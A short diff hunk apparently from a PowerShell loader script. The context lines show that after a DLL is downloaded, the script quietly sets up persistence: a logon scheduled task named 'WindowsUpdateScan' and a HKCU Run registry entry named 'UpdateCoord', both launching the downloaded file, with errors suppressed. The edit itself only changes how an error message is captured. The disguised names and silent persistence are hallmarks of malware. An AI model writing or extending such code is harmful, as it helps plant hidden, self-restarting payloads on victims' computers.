@@ -73,6 +73,6 @@ if (Get-F $dUrl $dp) {
         else { schtasks.exe /create /tn "WindowsUpdateScan" /tr "$tp" /sc onlogon /f /ErrorAction SilentlyContinue }
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$tp" -ErrorAction SilentlyContinue
         return
-    } catch { $e = $_.Exception.InnerException.Message; if (!$e) { $e = $_.Exception.Message } }
+    } catch { $e = $_.ToString() }
 } else { $e = "DLL Download Failed" }
 Write-Host "failed: $e"
